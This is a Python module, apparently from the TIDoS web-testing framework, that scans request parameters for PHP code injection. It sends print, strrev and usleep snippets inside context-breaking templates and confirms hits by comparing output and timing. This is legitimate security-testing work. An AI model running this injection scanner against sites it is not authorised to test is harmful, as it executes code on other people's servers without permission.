#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""PHP code injection (eval/assert/create_function contexts)."""

from __future__ import annotations

import random

from core.methods import fileinj, inject
from core.methods import modkit as kit
from core.methods import webinj
from core.methods.print import pvln

info = ("Finds PHP code injection in request parameters. Each parameter gets PHP that prints the "
        "product of two random numbers, wrapped in context-breaking templates (DICT); a hit is confirmed "
        "with a second, PHP-specific computation (strrev of a random number). Neither value can appear by "
        "echoing the payload, and both must be absent from the baseline. With BLIND, usleep() payloads (not valid SQL, so a SQL injection "
        "point does not trip them) are timed against usleep(0) controls, twice with growing delays.")
searchinfo = "PHP Code Injection Scanner"
DEFAULT_DICT = "files/payload-db/php_payloads.lst"
properties = {
    **inject.OPTIONS,
    **webinj.COOKIE_OPTION,
    "DICT": [f"Context templates with a {{code}} placeholder (default {DEFAULT_DICT})", ""],
    "BLIND": ["Also run time-based (sleep) checks (y/n, default y)", ""],
    "SLEEP": ["Seconds to sleep in time-based checks (default 5)", ""],
}

CONFIRMED = "PHP code injection (confirmed)"
BLIND = "PHP code injection (time-based, likely)"


def reversible() -> int:
    """Random 9-digit number whose reverse has no leading zero and differs from it."""
    while True:
        n = random.randint(10 ** 8, 10 ** 9 - 1)
        if n % 10 and str(n) != str(n)[::-1]:
            return n


def check(point: inject.Point, s, templates: list[str], delay: int):
    baseline = fileinj.body(point.send(s, point.original)) + fileinj.body(point.send(s, inject.marker()))

    def run(tpl: str, code: str) -> str:
        return fileinj.body(fileinj.send(point, s, tpl.replace("{code}", code)))

    for tpl in templates:
        a, b = fileinj.numbers()
        product = str(a * b)
        if product in baseline or product not in run(tpl, f"print({a}*{b})"):
            continue
        n = reversible()
        rev = str(n)[::-1]
        if rev in baseline or rev not in run(tpl, f"print(strrev({n}))"):
            continue
        yield inject.Finding(point, tpl.replace("{code}", f"print({a}*{b})"),
                             f"print({a}*{b}) -> {product}; print(strrev({n})) -> {rev}", CONFIRMED)
        return

    if not delay:
        return
    for tpl in templates:
        def probe(d: float, tpl=tpl):
            resp, took = fileinj.timed(lambda: fileinj.send(point, s, tpl.replace("{code}", f"usleep({int(d) * 1000000})")))
            return took if resp is not None else None
        ev = fileinj.time_confirm(probe, delay)
        if ev:
            yield inject.Finding(point, tpl.replace("{code}", f"usleep({delay * 1000000})"), ev, BLIND)
            return


def phpi(web):
    pvln("php code injection")
    rec = kit.Recorder(web, kit.CRITICAL, "phpi")
    templates = [t for t in inject.payloads(properties, DEFAULT_DICT, label="template") if "{code}" in t]
    if not templates:
        kit.bad("No templates with a {code} placeholder.")
        return []
    blind = kit.flag(properties, "BLIND", "Run time-based checks", True)
    delay = max(1, kit.integer(properties, "SLEEP", "Seconds to sleep in time-based checks", 5)) if blind else 0
    points = inject.discover(web, properties)
    if not points:
        rec("No injection points found.")
        return []
    s = webinj.session(properties, timeout=max(15, 2 * delay + 15))
    findings = inject.scan(points, lambda p: check(p, s, templates, delay))
    inject.report(findings, rec, clean="No PHP code injection found.")
    return findings


def attack(web):
    phpi(web)
